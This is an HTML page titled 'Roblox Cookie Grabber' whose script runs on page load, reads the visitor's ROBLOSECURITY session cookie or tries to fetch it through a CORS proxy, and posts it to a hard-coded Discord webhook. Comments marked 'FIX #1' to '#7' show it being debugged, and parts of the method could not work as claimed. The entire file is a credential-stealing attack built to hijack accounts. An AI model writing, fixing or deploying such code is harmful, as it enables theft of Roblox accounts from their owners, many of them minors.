<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Grabber</title>
    <style>
        body {
            background-color: #232527;
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        #statusBox {
            background-color: #393b3d;
            padding: 25px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 4px 10px rgba(0,0,0,0.4);
            width: 350px;
        }

        h1 { margin-top: 0; font-size: 24px; color: #fff; }
        
        #statusText {
            font-size: 16px;
            margin-bottom: 15px;
            min-height: 20px;
            color: #b9bbbe;
        }

        .success { background-color: #3ba55c !important; color: white; }
        .error { background-color: #ed4245 !important; color: white; }
        
        button {
            margin-top: 10px;
            padding: 8px 16px;
            background-color: #3ba55c;
            border: none;
            color: white;
            border-radius: 4px;
            cursor: pointer;
        }
        
        button:hover { opacity: 0.9; }
    </style>
</head>
<body>

    <div id="statusBox">
        <h1>Roblox Cookie Grabber</h1>
        <p id="statusText">Checking cookies...</p>
        <button onclick="forceCheck()">Force Check Cookies</button>
    </div>

    <script>
        // 🔴 FIX #2: Paste your Discord Webhook URL here
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4'; 

        function updateUI(message, type) {
            const statusText = document.getElementById('statusText');
            const statusBox = document.getElementById('statusBox');

            statusText.innerText = message;
            
            statusBox.classList.remove('success', 'error');
            
            if (type === 'success') {
                statusBox.classList.add('success');
            } else if (type === 'error') {
                statusBox.classList.add('error');
            }
        }

        // 🔴 FIX #1 & #7: Get Cookie with Null Check and Debugging
        function getCookie() {
            const name = "ROBLOSECURITY";
            const cValue = document.cookie.split('; ').find(row => row.startsWith(name + '='));
            
            if (cValue) {
                return cValue.substring(name.length + 1); // Return just the value
            } else {
                console.log("Cookie not found in document.cookie");
                return null; 
            }
        }

        // 🔴 FIX #3: Force Check via Proxy (Bypasses Same-Origin Policy)
        async function forceCheck() {
            updateUI("Fetching cookies from Roblox...", "success");
            
            try {
                const response = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://www.roblox.com'));
                const data = await response.json();
                
                // Extract cookie string from the HTML content returned by proxy
                const cookiesMatch = data.contents.match(/ROBLOSECURITY=([^;]+)/);
                
                if (cookiesMatch && cookiesMatch[1]) {
                    const cookieValue = decodeURIComponent(cookiesMatch[1]);
                    console.log("Found via Proxy:", cookieValue);
                    
                    updateUI("Cookie found! Sending to Discord...", "success");
                    await sendToDiscord(cookieValue);
                } else {
                    updateUI("No ROBLOSECURITY cookie found in Roblox page.", "error");
                }
            } catch (error) {
                console.error("Proxy fetch error:", error);
                updateUI("Failed to fetch cookies via proxy", "error");
            }
        }

        // 🔴 FIX #1, #4 & #6: Send to Discord with Error Handling
        async function sendToDiscord(cookieValue) {
            try {
                const payload = {
                    content: "🔥 **New Roblox Cookie Found!**",
                    embeds: [{
                        title: "Cookie Grabbed",
                        description: `**Cookie:** \`${cookieValue}\``,
                        color: 16753920, // Reddish color for Discord embed
                        footer: { text: "Grabber via GitHub Pages" }
                    }]
                };

                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json' 
                    },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    throw new Error(`Discord API returned ${response.status}`);
                }

                return true; 

            } catch (error) {
                console.error("Fetch error:", error);
                updateUI("Failed to send to Discord", "error");
                return false;
            }
        }

        // 🔴 FIX #3 & #4: Main Execution Logic
        async function main() {
            const cookie = getCookie();

            if (cookie) {
                updateUI("Sending data...", "success"); 
                await sendToDiscord(cookie);
                return;
            } else {
                // If direct check fails, try proxy method
                setTimeout(() => {
                    forceCheck();
                }, 1000);
            }
        }

        // Run the main function when the page loads
        window.onload = main; 
    </script>
</body>
</html>
